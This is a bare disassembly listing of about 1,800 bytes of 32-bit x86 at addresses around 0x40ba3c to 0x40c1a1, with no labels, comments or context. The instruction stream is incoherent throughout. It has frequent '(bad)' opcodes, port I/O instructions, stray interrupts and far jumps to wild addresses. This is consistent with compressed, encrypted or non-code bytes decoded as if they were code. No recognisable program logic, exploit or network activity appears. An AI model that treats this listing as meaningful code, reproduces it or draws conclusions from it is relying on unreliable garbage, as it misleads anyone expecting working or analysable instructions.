  40ba3c:	dec    eax
  40ba3d:	rol    cl,0xe5
  40ba40:	xor    dh,BYTE PTR [ebx+ecx*4]
  40ba43:	add    eax,0xb7fbcaac
  40ba48:	and    DWORD PTR [ebx+0x0],esp
  40ba4b:	xchg   ebx,eax
  40ba4c:	adc    eax,0x4af174ce
  40ba51:	inc    esp
  40ba52:	jbe    0x40ba4a
  40ba54:	jns    0x40b9d7
  40ba56:	inc    esp
  40ba57:	in     eax,dx
  40ba58:	mov    ebp,0xf2315615
  40ba5d:	or     BYTE PTR [ebx+0x4140ff1c],cl
  40ba63:	jmp    0x5540ca1a
  40ba68:	outs   dx,BYTE PTR ds:[esi]
  40ba69:	popa   
  40ba6a:	pop    ebx
  40ba6b:	dec    ebx
  40ba6c:	jb     0x40ba77
  40ba6e:	push   edi
  40ba6f:	rcl    DWORD PTR [ebp+0x25e90064],1
  40ba75:	leave  
  40ba76:	jae    0x40ba46
  40ba78:	inc    eax
  40ba79:	loope  0x40ba31
  40ba7b:	imul   ebp,ecx,0xffffffce
  40ba7e:	dec    edi
  40ba7f:	adc    DWORD PTR ds:0x8a57ef09,esi
  40ba85:	cmp    al,0x62
  40ba87:	sub    BYTE PTR [eax],al
  40ba89:	xor    eax,0xe500ff39
  40ba8e:	add    eax,ebp
  40ba90:	ret    
  40ba91:	imul   esi,DWORD PTR [ecx+0x318ce8fd],0xab3ffff
  40ba9b:	inc    esi
  40ba9c:	or     BYTE PTR [esi],0x5
  40ba9f:	jne    0x40ba9b
  40baa1:	xchg   esi,eax
  40baa2:	mov    ch,0x31
  40baa4:	shl    BYTE PTR [ecx-0x250],0xb3
  40baab:	lods   al,BYTE PTR ds:[esi]
  40baac:	cmp    BYTE PTR [edi-0x1a0044c2],dl
  40bab2:	mov    ch,0xfd
  40bab4:	jne    0x40ba46
  40bab6:	loope  0x40bade
  40bab8:	jbe    0x40bb19
  40baba:	mov    cl,0x5d
  40babc:	pop    esi
  40babd:	inc    ecx
  40babe:	les    eax,FWORD PTR [edx]
  40bac0:	add    ch,al
  40bac2:	jl     0x40baae
  40bac4:	add    DWORD PTR [esi+esi*4+0x68],0x0
  40bac9:	mov    dl,0x25
  40bacb:	push   DWORD PTR [ebp+0x60]
  40bace:	loope  0x40ba98
  40bad0:	jne    0x40bb31
  40bad2:	mov    ch,0x87
  40bad4:	inc    ebp
  40bad5:	pop    esp
  40bad6:	pop    esp
  40bad7:	add    BYTE PTR [edx+0x58],ch
  40bada:	popa   
  40badb:	imul   esp,DWORD PTR [edx+0x19],0x5
  40badf:	push   0x80094800
  40bae4:	call   0x3fec9d
  40bae9:	adc    ecx,ecx
  40baeb:	jb     0x40bb0c
  40baed:	add    BYTE PTR [eax-0x23],cl
  40baf0:	inc    edx
  40baf1:	sbb    bh,0xb4
  40baf4:	dec    esi
  40baf5:	push   0xbeef0908
  40bafa:	jo     0x40bb63
  40bafc:	bound  eax,QWORD PTR [ecx+0x18]
  40baff:	sbb    edi,edi
  40bb01:	jne    0x40bb03
  40bb03:	loope  0x40bb53
  40bb05:	mov    eax,ds:0xe7d67331
  40bb0a:	mov    dl,bh
  40bb0c:	(bad)  
  40bb0d:	(bad)  
  40bb0e:	out    0xcd,al
  40bb10:	(bad)  
  40bb11:	(bad)  
  40bb12:	fs (bad) 
  40bb15:	retf   
  40bb16:	pop    esp
  40bb17:	push   ebx
  40bb18:	xlat   BYTE PTR ds:[ebx]
  40bb19:	enter  0xe6f3,0x2
  40bb1d:	push   ebp
  40bb1e:	mov    edx,0xbdc38336
  40bb23:	mov    eax,0x33046a02
  40bb28:	push   ecx
  40bb29:	or     BYTE PTR [ecx-0x5900b04e],bl
  40bb2f:	pop    ecx
  40bb30:	inc    ecx
  40bb31:	cld    
  40bb32:	or     edx,esp
  40bb34:	add    ch,bh
  40bb36:	xlat   BYTE PTR ds:[ebx]
  40bb37:	retf   0x619d
  40bb3a:	lock loope 0x40bba7
  40bb3d:	mov    bl,0x13
  40bb3f:	mov    eax,ds:0xda04ff02
  40bb44:	jmp    0xe4fe:0xd6f3d05a
  40bb4b:	std    
  40bb4c:	(bad)  
  40bb4d:	je     0x40bb88
  40bb4f:	cli    
  40bb50:	je     0x40bbc6
  40bb52:	add    BYTE PTR [esi-0x35],bl
  40bb55:	retf   
  40bb56:	shr    DWORD PTR ds:0x5d8b2fe2,0x5f
  40bb5d:	sar    bl,0xdb
  40bb60:	loope  0x40bbca
  40bb62:	cs ds xor eax,0x2cfce80c
  40bb69:	xlat   BYTE PTR ds:[ebx]
  40bb6a:	(bad)  
  40bb6b:	mov    eax,0x3167d824
  40bb70:	loop   0x40bb57
  40bb72:	mov    ebp,0x41614c89
  40bb77:	xor    DWORD PTR [edx-0x4d],ecx
  40bb7a:	popa   
  40bb7b:	jo     0x40bb5f
  40bb7d:	aad    0x74
  40bb7f:	cmp    DWORD PTR [ecx],ecx
  40bb81:	xchg   ecx,eax
  40bb82:	and    edx,eax
  40bb84:	retf   
  40bb85:	popf   
  40bb86:	imul   esi,DWORD PTR [ecx],0x9
  40bb89:	xchg   BYTE PTR [ebp+0x450ac256],dl
  40bb8f:	xor    DWORD PTR [ecx-0x66],esp
  40bb92:	popa   
  40bb93:	jo     0x40bb9e
  40bb95:	jle    0x40bbe7
  40bb97:	sub    ecx,esp
  40bb99:	fbld   TBYTE PTR [edi+ecx*8-0x3aaf9235]
  40bba0:	retf   
  40bba1:	fisttp DWORD PTR [ebx]
  40bba3:	leave  
  40bba4:	or     edx,esp
  40bba6:	(bad)  
  40bba7:	mov    bh,0xc1
  40bba9:	sub    bh,bh
  40bbab:	scas   al,BYTE PTR es:[edi]
  40bbac:	xor    al,0x62
  40bbae:	out    0xb3,eax
  40bbb0:	les    eax,FWORD PTR [edx+ecx*4+0x5]
  40bbb4:	stc    
  40bbb5:	jno    0x40bba8
  40bbb7:	add    BYTE PTR [eax],cl
  40bbb9:	or     DWORD PTR [eax+eax*2-0x73],esp
  40bbbd:	cmp    BYTE PTR [esi],ch
  40bbbf:	push   eax
  40bbc0:	cmp    DWORD PTR [edi-0x17],ebx
  40bbc3:	(bad)  
  40bbc4:	add    eax,0x15311df9
  40bbc9:	xchg   BYTE PTR [eax],ch
  40bbcb:	push   eax
  40bbcc:	push   ss
  40bbcd:	xor    BYTE PTR [ebx-0x16a14929],0x69
  40bbd4:	xor    DWORD PTR [ecx-0x2],esp
  40bbd7:	add    DWORD PTR [ecx],esi
  40bbd9:	or     esi,esi
  40bbdb:	dec    edi
  40bbdc:	cmp    eax,0xc0d5ee5f
  40bbe1:	add    al,0x53
  40bbe3:	add    al,0xcb
  40bbe5:	or     cl,dl
  40bbe7:	mov    ebp,0x73e908d0
  40bbec:	das    
  40bbed:	push   ebp
  40bbee:	int    0xec
  40bbf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbf1:	jmpw   0xa3f8
  40bbf5:	(bad)  
  40bbf6:	in     al,dx
  40bbf7:	add    edi,DWORD PTR [esi+edi*2-0x1]
  40bbfb:	les    esi,FWORD PTR [eax+0x5662fbc6]
  40bc01:	cmc    
  40bc02:	mov    bh,bl
  40bc04:	mov    BYTE PTR [ecx],cl
  40bc06:	lea    esp,[ecx+ebx*8]
  40bc09:	cmp    bh,bh
  40bc0b:	sbb    al,0x39
  40bc0d:	retf   0xe174
  40bc10:	pop    eax
  40bc11:	or     edi,edi
  40bc13:	cld    
  40bc14:	into   
  40bc15:	retf   
  40bc16:	push   ecx
  40bc17:	rcl    DWORD PTR [edi-0x76],1
  40bc1a:	je     0x40bbea
  40bc1c:	add    BYTE PTR [ecx+0x5b59fc35],bh
  40bc22:	or     DWORD PTR [edx-0x17],ebp
  40bc25:	dec    edx
  40bc26:	retf   0xe902
  40bc29:	xor    cl,dl
  40bc2b:	je     0x40bc26
  40bc2d:	sbb    dl,cl
  40bc2f:	(bad)  
  40bc30:	(bad)  [esi+0x32d30060]
  40bc36:	loope  0x40bcb0
  40bc38:	retf   
  40bc39:	xor    cl,BYTE PTR [ecx]
  40bc3b:	nop
  40bc3c:	ss dec ah
  40bc3f:	out    0xf9,eax
  40bc41:	adc    DWORD PTR [ecx],ecx
  40bc43:	add    BYTE PTR [eax],dh
  40bc45:	jae    0x40bc41
  40bc47:	push   DWORD PTR [ebx+0x2d82dea9]
  40bc4d:	int    0x33
  40bc4f:	or     DWORD PTR [edx+ebp*2+0x25ec73ca],0xffffffc0
  40bc57:	rcl    ebp,0x32
  40bc5a:	jle    0x40bcb0
  40bc5c:	fnstsw WORD PTR [ecx-0x555b7308]
  40bc62:	cmp    ch,BYTE PTR [edx-0x17]
  40bc65:	gs push ebp
  40bc67:	or     al,0xde
  40bc69:	out    0x0,eax
  40bc6b:	push   0xffffffe9
  40bc6d:	add    eax,0x60ce1455
  40bc72:	xor    eax,0x3ac80085
  40bc77:	push   edx
  40bc78:	(bad)  
  40bc79:	dec    ebp
  40bc7a:	jno    0x40bc7a
  40bc7c:	call   FWORD PTR [eax]
  40bc7e:	push   es
  40bc7f:	mov    edx,DWORD PTR [ebp+0x0]
  40bc82:	add    BYTE PTR [ecx+0x714d8d10],0x4e
  40bc89:	lea    ecx,[ebp-0x3b]
  40bc8c:	dec    esi
  40bc8d:	push   0xffffffe8
  40bc8f:	mov    ah,0x73
  40bc91:	mov    eax,0x830c17b7
  40bc96:	xor    eax,0xed73fe71
  40bc9b:	cmp    BYTE PTR [ebx-0x40],0x47
  40bc9f:	cmp    edx,DWORD PTR [edi+edi*8]
  40bca2:	mov    ebp,0x5737fdd5
  40bca7:	cmp    ecx,DWORD PTR [edi+edi*8]
  40bcaa:	(bad)  
  40bcac:	(bad)  
  40bcad:	push   ebp
  40bcae:	mov    al,ds:0x58e835b4
  40bcb3:	push   0x8d0b0000
  40bcb8:	add    bh,bh
  40bcba:	lds    esi,FWORD PTR [ecx+0x73]
  40bcbd:	loopne 0x40bcb2
  40bcbf:	outs   dx,BYTE PTR ds:[esi]
  40bcc0:	mov    DWORD PTR [ebp+0x0],edx
  40bcc3:	adc    DWORD PTR [eax],0xfd6d9dff
  40bcc9:	push   edx
  40bcca:	adc    BYTE PTR [ecx+ecx*8],0xc2
  40bcce:	ins    BYTE PTR es:[edi],dx
  40bccf:	add    eax,0x87648b55
  40bcd4:	ret    0x36f8
  40bcd7:	mov    ch,0xfd
  40bcd9:	push   edi
  40bcda:	jecxz  0x40bcf6
  40bcdc:	adc    BYTE PTR [ebx-0x77c7d96],cl
  40bce2:	push   esi
  40bce3:	mov    ch,0xfd
  40bce5:	push   eax
  40bce6:	add    dl,ah
  40bce8:	add    al,0xff
  40bcea:	jne    0x40bd2c
  40bcec:	sub    eax,DWORD PTR [eax]
  40bcee:	push   DWORD PTR [ecx]
  40bcf0:	gs hlt 
  40bcf2:	inc    BYTE PTR [ebx-0x5b4076ea]
  40bcf8:	pop    esp
  40bcf9:	retf   
  40bcfa:	test   BYTE PTR ds:0x31fed289,dl
  40bd00:	mov    dl,0x2
  40bd02:	add    BYTE PTR [edx-0x10233a3],bh
  40bd08:	outs   dx,DWORD PTR ds:[esi]
  40bd09:	jle    0x40bd1c
  40bd0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd0c:	sub    eax,0x9feefdd0
  40bd11:	xor    ecx,DWORD PTR [ebp-0x12e4d54]
  40bd17:	fisub  WORD PTR [edx]
  40bd19:	pop    esi
  40bd1a:	adc    dh,dl
  40bd1c:	std    
  40bd1d:	retf   
  40bd1e:	std    
  40bd1f:	into   
  40bd20:	aas    
  40bd21:	rcl    DWORD PTR [ecx+0x35],cl
  40bd24:	xor    edx,DWORD PTR [ecx-0x2cd04005]
  40bd2a:	inc    DWORD PTR [edx+0xd]
  40bd2d:	cmp    DWORD PTR [ecx+esi*1-0x59012ca1],0x24fef6dd
  40bd38:	loop   0x40bd0b
  40bd3a:	je     0x40bd61
  40bd3c:	lahf   
  40bd3d:	shl    DWORD PTR [ecx+edi*1+0x4a],1
  40bd41:	or     edi,edi
  40bd43:	xchg   bh,dh
  40bd45:	xchg   dh,al
  40bd47:	and    edi,ebp
  40bd49:	cmp    bl,0x0
  40bd4c:	ja     0x40bd75
  40bd4e:	shl    DWORD PTR [edx+edx*2+0xb],cl
  40bd52:	stos   DWORD PTR es:[edi],eax
  40bd53:	mov    bh,BYTE PTR [edx+ebx*1+0x3b5efed2]
  40bd5a:	idiv   dh
  40bd5c:	pushf  
  40bd5d:	or     dl,dl
  40bd5f:	dec    BYTE PTR [esi-0x41]
  40bd62:	xor    al,0x8
  40bd64:	out    0xe8,al
  40bd66:	lds    ecx,FWORD PTR [edi]
  40bd68:	xor    DWORD PTR [ecx],ecx
  40bd6a:	cmp    al,0x7f
  40bd6c:	dec    edx
  40bd6d:	mov    ah,BYTE PTR [ebx+ecx*8+0x3ad5c82c]
  40bd74:	mov    edx,0x407edd5d
  40bd79:	xchg   esi,eax
  40bd7a:	imul   ecx,ebx,0x14
  40bd7d:	enter  0x33bd,0x9b
  40bd81:	or     DWORD PTR [ebx+0x4],eax
  40bd84:	push   es
  40bd85:	ds fst st(2)
  40bd88:	pusha  
  40bd89:	add    DWORD PTR [ebx+eax*8+0x7d],ebp
  40bd8d:	sub    esp,DWORD PTR [esi-0x16f712b8]
  40bd93:	add    esi,DWORD PTR [ecx]
  40bd95:	cdq    
  40bd96:	popa   
  40bd97:	js     0x40bd7f
  40bd99:	mov    BYTE PTR [ebp+0x6c1aabd2],0x48
  40bda0:	int    0x58
  40bda2:	fs mov dl,cl
  40bda5:	(bad)  
  40bda6:	ins    DWORD PTR es:[edi],dx
  40bda7:	shr    BYTE PTR [esi+0x33],cl
  40bdaa:	stc    
  40bdab:	sar    BYTE PTR [ebp-0x40],cl
  40bdae:	pop    esi
  40bdaf:	rol    BYTE PTR [eax],cl
  40bdb1:	scas   eax,DWORD PTR es:[edi]
  40bdb2:	(bad)  
  40bdb3:	mov    edx,0xcb8bb6ff
  40bdb8:	iret   
  40bdb9:	sahf   
  40bdba:	xchg   edi,eax
  40bdbb:	mov    esp,0x3c85a426
  40bdc0:	ror    DWORD PTR [edi-0x22da739],1
  40bdc6:	sbb    BYTE PTR [esi],ch
  40bdc8:	pop    eax
  40bdc9:	sub    eax,0xdffb9bc8
  40bdce:	mov    al,0xea
  40bdd0:	shr    BYTE PTR [edi-0x39],cl
  40bdd3:	imul   ecx,edx,0x400d9936
  40bdd9:	pop    ebp
  40bdda:	cwde   
  40bddb:	jnp    0x40bdc6
  40bddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdde:	mov    bl,0x4d
  40bde0:	jle    0x40bd87
  40bde2:	sar    bh,0xf6
  40bde5:	pusha  
  40bde6:	(bad)  
  40bde7:	mov    bl,bl
  40bde9:	arpl   WORD PTR [edi+esi*8-0x19],di
  40bded:	pusha  
  40bdee:	(bad)  
  40bdef:	(bad)  
  40bdf0:	cmp    ebp,DWORD PTR ds:0x31abc968
  40bdf6:	or     DWORD PTR [ebp+0x62],edx
  40bdf9:	adc    eax,ecx
  40bdfb:	je     0x40bdee
  40bdfd:	add    DWORD PTR [esi],edi
  40bdff:	sbb    cl,dl
  40be01:	push   ebp
  40be02:	cmp    edi,edi
  40be04:	mov    dh,0xe0
  40be06:	cmp    eax,0x281ec10c
  40be0b:	add    cl,ch
  40be0d:	ret    
  40be0e:	out    0x82,al
  40be10:	test   eax,0x1cff5937
  40be15:	add    BYTE PTR [ecx],dh
  40be17:	(bad)  
  40be18:	je     0x40be0b
  40be1a:	cli    
  40be1b:	add    eax,0xc8008672
  40be20:	je     0x40bdf7
  40be22:	loope  0x40be61
  40be24:	adc    BYTE PTR [esi+0x5e],dh
  40be27:	and    eax,ebp
  40be29:	mov    esi,0x30fec664
  40be2e:	out    dx,eax
  40be2f:	sbb    al,BYTE PTR [eax]
  40be31:	mov    ah,0x2d
  40be33:	mov    dl,0xfe
  40be35:	fsubr  QWORD PTR [edx+0x7af174c7]
  40be3b:	scas   eax,DWORD PTR es:[edi]
  40be3c:	jo     0x40be84
  40be3e:	add    bh,0x74
  40be41:	in     eax,dx
  40be42:	push   0xa
  40be44:	pusha  
  40be45:	jmp    0x2e91077c
  40be4a:	out    0x14,al
  40be4c:	call   FWORD PTR [edx+ecx*4-0x7e64f852]
  40be53:	(bad)  
  40be54:	(bad)  
  40be55:	pushf  
  40be56:	pop    esi
  40be57:	(bad)  
  40be58:	je     0x40be53
  40be5a:	cmp    DWORD PTR ds:0xd7400018,0x834fff6f
  40be64:	rcl    BYTE PTR [eax+ebx*2],0xff
  40be68:	mov    ch,ah
  40be6a:	leave  
  40be6b:	rcl    dl,1
  40be6d:	test   DWORD PTR [edi-0x27],0x463075fd
  40be74:	test   BYTE PTR [eax],al
  40be76:	cld    
  40be77:	fdivr  st,st(5)
  40be79:	push   eax
  40be7a:	add    bh,ch
  40be7c:	pop    esi
  40be7d:	or     al,ch
  40be7f:	pop    ss
  40be80:	xlat   BYTE PTR ds:[ebx]
  40be81:	std    
  40be82:	jmp    DWORD PTR [edx+0xd]
  40be85:	push   0x0
  40be87:	jo     0x40be61
  40be89:	add    DWORD PTR [eax],eax
  40be8b:	or     BYTE PTR [edi-0x7c],al
  40be8e:	add    al,dl
  40be90:	fdivr  st,st(5)
  40be92:	push   eax
  40be93:	inc    edx
  40be94:	fdivr  st,st(5)
  40be96:	jne    0x40be80
  40be98:	arpl   WORD PTR [eax],ax
  40be9a:	push   0xffffffc8
  40be9c:	loope  0x40beba
  40be9e:	pusha  
  40be9f:	enter  0xc709,0x85
  40bea3:	dec    eax
  40bea4:	loope  0x40bea3
  40bea6:	(bad)  
  40bea7:	call   0x9740beb5
  40beac:	mov    ?,edx
  40beae:	test   DWORD PTR [edi-0x27],0x9980000
  40beb5:	mov    DWORD PTR [ebp-0x21f00],0x988
  40bebf:	inc    edi
  40bec0:	(bad)  
  40bec1:	cli    
  40bec2:	test   DWORD PTR [edi-0x27],0x998fffe
  40bec9:	mov    edx,DWORD PTR [ebp+0x60]
  40becc:	inc    esp
  40becd:	adc    DWORD PTR [edx-0x78],ebp
  40bed0:	inc    esi
  40bed1:	test   al,dh
  40bed3:	inc    edi
  40bed4:	fscale 
  40bed6:	push   eax
  40bed7:	xor    DWORD PTR ds:0x1666eb86,ebp
  40bedd:	ror    BYTE PTR [edi+0x0],1
  40bee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bee1:	xor    al,0xdb
  40bee3:	test   BYTE PTR [esi-0x3a],0x31
  40bee7:	(bad)  
  40bee8:	mov    esp,0x2d74cfdf
  40beed:	mov    bh,0x54
  40beef:	or     bl,cl
  40bef1:	scas   eax,DWORD PTR es:[edi]
  40bef2:	int    0x74
  40bef4:	dec    ecx
  40bef5:	jecxz  0x40bf28
  40bef7:	inc    esp
  40bef8:	mov    dl,0x9d
  40befa:	fcomi  st,st(6)
  40befc:	push   ds
  40befd:	aam    0x3
  40beff:	shrd   DWORD PTR [esi+0x2f310003],ebp,cl
  40bf06:	xchg   ecx,eax
  40bf07:	jmp    0x40bf07
  40bf09:	jnp    0x40bed9
  40bf0b:	jmp    FWORD PTR [edi]
  40bf0d:	inc    DWORD PTR cs:[eax]
  40bf10:	xor    DWORD PTR [edx-0x63fa7b3b],esi
  40bf16:	into   
  40bf17:	(bad)  
  40bf18:	xor    DWORD PTR [edx-0x6fb64223],esi
  40bf1e:	popa   
  40bf1f:	inc    ecx
  40bf20:	xor    DWORD PTR ds:0x43caff89,edi
  40bf26:	iret   
  40bf27:	dec    edi
  40bf28:	fnstenv [esi+0x2e]
  40bf2b:	add    BYTE PTR [ecx],dh
  40bf2d:	sub    eax,0xf37373c4
  40bf32:	mov    bl,dl
  40bf34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf35:	arpl   di,cx
  40bf37:	add    BYTE PTR [ecx],dh
  40bf39:	dec    ebx
  40bf3a:	mov    fs,WORD PTR [edi-0x5b]
  40bf3d:	rol    BYTE PTR [ebx+0x0],1
  40bf40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf41:	xor    eax,0x8e00fc04
  40bf46:	add    esi,DWORD PTR [eax+ebp*8]
  40bf49:	int3   
  40bf4a:	fwait
  40bf4b:	add    al,BYTE PTR [eax]
  40bf4d:	mov    ah,0xf2
  40bf4f:	push   edi
  40bf50:	and    ebp,DWORD PTR [esi+0x9]
  40bf53:	ins    BYTE PTR es:[edi],dx
  40bf54:	mov    eax,0x21dc467
  40bf59:	xor    DWORD PTR [esi+edx*2-0x57d7d2a4],esi
  40bf60:	add    esp,DWORD PTR [esi+ecx*4-0x3bb03018]
  40bf67:	cwde   
  40bf68:	fld    TBYTE PTR [esp+eiz*2-0x364bfc17]
  40bf6f:	fisttp QWORD PTR [eax+0x3e90993]
  40bf75:	cdq    
  40bf76:	jmp    0x967204c4
  40bf7b:	imul   eax,DWORD PTR [ebx],0x19
  40bf7e:	(bad)  
  40bf7f:	int    0x33
  40bf81:	or     DWORD PTR [edx],esi
  40bf83:	dec    ecx
  40bf84:	add    al,0x31
  40bf86:	adc    BYTE PTR [ecx-0xc777fa9],ch
  40bf8c:	lahf   
  40bf8d:	imul   ecx,DWORD PTR [edx-0x17],0x3
  40bf91:	lea    esp,es:[edi+0x3]
  40bf95:	xor    DWORD PTR [ecx],ecx
  40bf97:	sahf   
  40bf98:	cwde   
  40bf99:	into   
  40bf9a:	mov    ebx,0x8dafce95
  40bf9f:	mov    dh,dl
  40bfa1:	xlat   BYTE PTR ds:[ebx]
  40bfa2:	ret    
  40bfa3:	test   DWORD PTR [eax-0x31824426],ebx
  40bfa9:	add    BYTE PTR [edi-0x40297373],dh
  40bfaf:	ret    
  40bfb0:	pop    ebx
  40bfb1:	mov    dh,bl
  40bfb3:	mov    ebx,0x2efece65
  40bfb8:	call   0xe96ff116
  40bfbd:	pop    ecx
  40bfbe:	xor    DWORD PTR [edi],ebp
  40bfc0:	jmp    0x3de96d45
  40bfc5:	into   
  40bfc6:	(bad)  
  40bfc7:	pop    eax
  40bfc8:	ds clc 
  40bfca:	fimul  DWORD PTR [edi+0x0]
  40bfcd:	test   al,0x32
  40bfcf:	adc    al,al
  40bfd1:	mov    ch,0xef
  40bfd3:	ret    
  40bfd4:	je     0x40bfd3
  40bfd6:	jg     0x40c054
  40bfd8:	xlat   BYTE PTR ds:[ebx]
  40bfd9:	push   ss
  40bfda:	ja     0x40bf9e
  40bfdc:	(bad)  
  40bfdd:	pop    esp
  40bfde:	mov    ?,WORD PTR [edx+0x3c670efe]
  40bfe4:	adc    BYTE PTR [esi],al
  40bfe6:	test   eax,0x74fef6d7
  40bfeb:	stos   DWORD PTR es:[edi],eax
  40bfec:	maskmovq mm5,(bad)
  40bfed:	imul   DWORD PTR [edx+eax*8-0x2]
  40bff1:	xor    al,0x86
  40bff3:	mov    edx,0x310de6fe
  40bff8:	pop    esi
  40bff9:	jmp    0xd65d6e30
  40bffe:	xchg   BYTE PTR ds:0xbbf594ff,bl
  40c004:	inc    dh
  40c006:	cld    
  40c007:	jge    0x40bff4
  40c009:	mov    dh,0xf4
  40c00b:	ret    
  40c00c:	(bad)  
  40c00d:	cmp    al,0x0
  40c00f:	add    eax,0xdc95b4c4
  40c014:	ret    
  40c015:	(bad)  
  40c016:	xchg   ecx,eax
  40c017:	xlat   BYTE PTR ds:[ebx]
  40c018:	(bad)  
  40c01b:	hlt    
  40c01c:	jge    0x40c009
  40c01e:	sahf   
  40c01f:	in     al,dx
  40c020:	ret    
  40c021:	out    0x9,eax
  40c023:	add    al,0x9
  40c025:	add    BYTE PTR [eax+0x140016f3],dh
  40c02b:	dec    eax
  40c02c:	scas   al,BYTE PTR es:[edi]
  40c02d:	sub    BYTE PTR [ebp-0xb00a35b],0xb6
  40c034:	stos   BYTE PTR es:[edi],al
  40c035:	or     al,dh
  40c037:	xor    cl,BYTE PTR [ecx]
  40c039:	or     ebp,DWORD PTR [ecx]
  40c03b:	dec    BYTE PTR [ebx]
  40c03d:	pop    esi
  40c03e:	and    BYTE PTR [ebx+0xe],dh
  40c041:	add    BYTE PTR [eax],bh
  40c043:	lea    eax,[edi+0x419a00bf]
  40c049:	iret   
  40c04a:	(bad)  
  40c04b:	int    0xe2
  40c04d:	dec    esi
  40c04e:	push   edx
  40c04f:	inc    edi
  40c050:	pop    edx
  40c051:	or     al,0xe8
  40c053:	and    DWORD PTR [edx-0x2],eax
  40c056:	inc    DWORD PTR [ebx+0x1c4d877f]
  40c05c:	loopne 0x40c066
  40c05e:	ss push edi
  40c060:	pushf  
  40c061:	inc    edx
  40c062:	sub    DWORD PTR [edi+eax*1+0x45],edx
  40c066:	aam    0x99
  40c068:	mov    edi,esi
  40c06a:	adc    al,0xca
  40c06c:	(bad)  
  40c06d:	sub    esi,esi
  40c06f:	rcr    DWORD PTR [ecx-0x30],1
  40c072:	jmp    0x40c074
  40c074:	jo     0x40c092
  40c076:	movzx  ebx,BYTE PTR [ebx+eiz*1-0x14]
  40c07b:	push   eax
  40c07c:	cmp    cl,0x62
  40c07f:	inc    ecx
  40c080:	or     BYTE PTR [ebx+0x44],al
  40c083:	fcomp  DWORD PTR [eax-0x1b]
  40c086:	push   cs
  40c087:	pop    edi
  40c088:	sbb    BYTE PTR [esi],al
  40c08a:	add    esp,0x14
  40c08d:	inc    ebx
  40c08e:	inc    esp
  40c08f:	fcomp  DWORD PTR [eax]
  40c091:	aam    0x73
  40c093:	shl    al,1
  40c095:	outs   dx,DWORD PTR ds:[esi]
  40c096:	je     0x40c097
  40c098:	xchg   edi,eax
  40c099:	ds inc esp
  40c09b:	ror    BYTE PTR [esi],1
  40c09d:	mov    ah,bh
  40c09f:	adc    al,0x3a
  40c0a1:	js     0x40c122
  40c0a3:	gs pushf 
  40c0a5:	aam    0xfe
  40c0a7:	(bad)  
  40c0a8:	fcom   st(4)
  40c0aa:	jae    0x40c080
  40c0ac:	and    cl,bh
  40c0ae:	bound  eax,QWORD PTR [ecx-0x38]
  40c0b1:	inc    edx
  40c0b2:	inc    esp
  40c0b3:	fcomp  DWORD PTR [eax]
  40c0b5:	in     eax,0xde
  40c0b7:	pop    esi
  40c0b8:	cwde   
  40c0b9:	add    eax,0x4294c483
  40c0be:	inc    esp
  40c0bf:	fdiv   DWORD PTR [ecx]
  40c0c1:	or     bl,0x74
  40c0c4:	add    DWORD PTR [edi-0x67],0x7a4a8e75
  40c0cb:	inc    esp
  40c0cc:	popa   
  40c0cd:	xor    al,0x46
  40c0cf:	int3   
  40c0d0:	loope  0x40c0cc
  40c0d2:	push   ebp
  40c0d3:	ror    BYTE PTR [ecx],1
  40c0d5:	rcr    DWORD PTR [edi+0x41],1
  40c0d8:	add    BYTE PTR [ecx],dh
  40c0da:	jmp    0x40c0f1
  40c0dc:	sar    cl,cl
  40c0de:	jo     0x40c0e2
  40c0e0:	call   0xff0c6589
  40c0e5:	sub    dh,al
  40c0e7:	sti    
  40c0e8:	and    DWORD PTR [esi-0x47fffd51],0x6c
  40c0ef:	mov    edx,0x2ebbc82
  40c0f4:	shrd   DWORD PTR ds:0xa7310003,ebp,cl
  40c0fb:	push   eax
  40c0fc:	or     al,0x19
  40c0fe:	jmp    0x8171c12c
  40c103:	jecxz  0x40c087
  40c105:	icebp  
  40c106:	mov    ah,0x7b
  40c108:	inc    esp
  40c109:	rol    edi,0x50
  40c10c:	or     al,0xb6
  40c10e:	in     eax,0x8f
  40c110:	inc    BYTE PTR [esi+eiz*2+0x6ff1447a]
  40c117:	push   eax
  40c118:	enter  0xedbe,0xbf
  40c11c:	(bad)  
  40c11d:	ins    BYTE PTR es:[edi],dx
  40c11e:	pop    esi
  40c11f:	add    al,0x0
  40c121:	xor    DWORD PTR [edx-0x147ac37b],esi
  40c127:	inc    esp
  40c128:	add    BYTE PTR [ecx],dh
  40c12a:	mov    esi,0x4a6c8d32
  40c12f:	xor    al,0x6a
  40c131:	xor    BYTE PTR [esp+eax*1],cl
  40c134:	push   0x31
  40c136:	pop    ebp
  40c137:	inc    ecx
  40c138:	mov    al,0x1
  40c13a:	or     ebx,edx
  40c13c:	add    eax,DWORD PTR [eax]
  40c13e:	mov    ah,0x46
  40c140:	sub    DWORD PTR [esi+ebx*4],esi
  40c143:	push   ss
  40c144:	test   DWORD PTR [edi],edi
  40c146:	lock or dl,ah
  40c149:	ret    
  40c14a:	add    bh,bl
  40c14c:	imul   ecx,DWORD PTR [ecx-0x3b],0xb217b509
  40c153:	fld    DWORD PTR ds:[ebx]
  40c156:	std    
  40c157:	adc    BYTE PTR [edx+0x31],ah
  40c15a:	inc    ecx
  40c15b:	daa    
  40c15c:	cs push es
  40c15e:	or     DWORD PTR es:[esi],ebx
  40c161:	push   ecx
  40c162:	sub    eax,eax
  40c164:	fwait
  40c165:	mov    edx,DWORD PTR [edi+0x36]
  40c168:	dec    ebp
  40c169:	retf   
  40c16a:	lds    ecx,FWORD PTR [ecx+edx*4]
  40c16d:	push   es
  40c16e:	xor    DWORD PTR [eax-0x425e23c2],esi
  40c174:	cmc    
  40c175:	retf   0x3637
  40c178:	sub    eax,0xe95d1cdc
  40c17d:	add    esp,DWORD PTR [esi]
  40c17f:	ss mov cl,0xdb
  40c182:	sbb    al,0x3a
  40c184:	(bad)  
  40c185:	retf   0x3617
  40c188:	mov    ecx,0xc63a04db
  40c18d:	retf   0xd264
  40c190:	stos   BYTE PTR es:[edi],al
  40c191:	idiv   esi
  40c193:	push   esp
  40c194:	(bad)  
  40c195:	xlat   BYTE PTR ds:[ebx]
  40c196:	mov    bl,0xc4
  40c198:	mov    al,ds:0x38bd7578
  40c19d:	pop    esp
  40c19e:	sub    DWORD PTR [eax+ebp*1],ebp
  40c1a1:	add    al,0x0
